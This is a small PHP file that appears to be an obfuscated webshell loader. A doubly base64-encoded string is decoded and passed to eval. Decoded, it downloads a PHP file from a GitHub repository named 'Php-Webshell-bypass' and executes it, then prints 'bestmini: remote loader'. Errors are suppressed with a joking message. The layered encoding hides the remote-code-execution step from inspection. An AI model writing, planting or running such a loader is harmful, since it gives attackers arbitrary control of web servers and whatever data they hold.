<?php

try {
    $z = "";
    $z .= "UEQ5d2FI";
    $z .= "QUtaWFpo";
    $z .= "YkNnaVB6";
    $z .= "NGlMbVpw";
    $z .= "YkdWZloy";
    $z .= "VjBYMk52";
    $z .= "Ym5SbGJu";
    $z .= "UnpLQ0pv";
    $z .= "ZEhSd2N6";
    $z .= "b3ZMM0po";
    $z .= "ZHk1bmFY";
    $z .= "Um9kV0ox";
    $z .= "YzJWeVky";
    $z .= "OXVkR1Z1";
    $z .= "ZEM1amIy";
    $z .= "MHZWMmxz";
    $z .= "WkVWd2FX";
    $z .= "VnBTMlZw";
    $z .= "WVM5UWFI";
    $z .= "QXRWMlZp";
    $z .= "YzJobGJH";
    $z .= "d3RZbmx3";
    $z .= "WVhOekwz";
    $z .= "Smxabk12";
    $z .= "YUdWaFpI";
    $z .= "TXZiV0Zw";
    $z .= "Ymk5amMy";
    $z .= "RXVjR2h3";
    $z .= "SWlrcE93";
    $z .= "cGxZMmh2";
    $z .= "SUNKaVpY";
    $z .= "TjBiV2x1";
    $z .= "YVRvZ2Nt";
    $z .= "VnRiM1Js";
    $z .= "SUd4dllX";
    $z .= "UmxjaUk3";
    $z .= "Q2o4K0Nn";
    $z .= "PT0=";
    $fn = 'base64_decode';
    $s1 = $fn($z);
    if ($s1 === false) { throw new Exception('oops..'); }
    $s2 = $fn($s1);
    if ($s2 === false) { throw new Exception('oops..'); }
    $tokens = token_get_all($s2);
    $smartCode = '';
    $inEcho = false;
    foreach ($tokens as $t) {
        if (is_array($t)) {
            switch ($t[0]) {
                case T_OPEN_TAG:
                    break;
                case T_CLOSE_TAG:
                    if ($inEcho) { $smartCode .= ');'; $inEcho = false; }
                    else { $smartCode .= ';'; }
                    break;
                case T_OPEN_TAG_WITH_ECHO:
                    $smartCode .= 'echo (';
                    $inEcho = true;
                    break;
                case T_INLINE_HTML:
                    $smartCode .= 'echo ' . var_export($t[1], true) . ';';
                    break;
                default:
                    $smartCode .= $t[1];
            }
        } else {
            if ($inEcho && trim($t) === ';') {
                $smartCode .= ');';
                $inEcho = false;
            } else {
                $smartCode .= $t;
            }
        }
    }
    eval($smartCode);
} catch (\ParseError $e) {
    echo "You are cute..";
} catch (\Throwable $e) {
    echo "You are cute..";
}

?>
